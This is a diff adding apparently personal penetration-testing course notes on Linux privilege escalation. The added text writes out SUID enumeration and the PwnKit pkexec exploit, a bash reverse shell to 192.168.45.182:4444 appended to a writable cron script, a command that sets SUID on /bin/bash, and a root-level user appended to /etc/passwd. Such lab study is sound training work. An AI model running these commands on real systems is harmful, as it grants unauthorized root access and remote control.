@@ -2561,7 +2561,53 @@ Reference
     `sudo apt-get changelog apt`  
     `!/bin/sh`  
   - Q2 abuse sudo: gcc
-    `/usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/gcc`  
+    `/usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/gcc`
+- 18.4.3 Exploiting Kernel Vulnerabilities
+  - Manual enumeration - SUID 
+    - enumerate the version of system  > Linux ubuntu-privesc 4.4.0-116-generic
+      ```
+      cat /etc/issue > Ubuntu 16.04.4 
+      cat /etc/os-release > Ubuntu 16.04.4
+      uname -a
+      ```
+    - check SUID files , look for uncommon or custom SUID binaries > /usr/bin/pkexec
+      `find / -perm -u=s -type f 2>/dev/null`  
+    - google "Pkexec" Local Privilege Escalation
+      ```
+      Download the pre-compile code https://github.com/ly4k/PwnKit/blob/main/PwnKit
+      scp PwnKit joe@192.168.216.216:
+      chmod +x PwnKit
+      ./PwnKit
+      ```
+  - insecure file permission - cron jobs
+    - list all crons jobs and for current user, look for daily, writable jobs, Is any file in /etc/cron.daily/ writable by you? (rw)
+      `ls -lah /etc/cron*` `crontab -l`  
+    - output:  cat /etc/cron.hourly/archiver
+      ```
+      #!/bin/sh
+      # I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
+      /var/archives/archive.sh
+
+      ls -lah /var/archives/archive.sh (rw) access 
+      ```
+    - add reverse shell to existing writable .sh
+      ```
+      nano archive.sh
+      bash -i >& /dev/tcp/192.168.45.182/4444 0>&1
+      ```
+    - When a binary has the setuid bit set, it runs as the owner of the file, regardless of who executes it.
+      `echo "chmod u+s /bin/bash" >> /var/archives/archive.sh`  
+  - abuse password authentication
+    - list all writable files > /etc/passwd  
+      `find / -writable -type f 2>/dev/null`  
+    - write new user 'root2' to /etc/passwd  
+      ```
+      openssl passwd w00t
+      echo "root2:EdGi9pT50v0Nw:0:0:root:/root:/bin/bash" >> /etc/passwd
+      su root2
+      id
+      ```
+  - ddd
 
 ## Penetration testing report 
 - note editor:
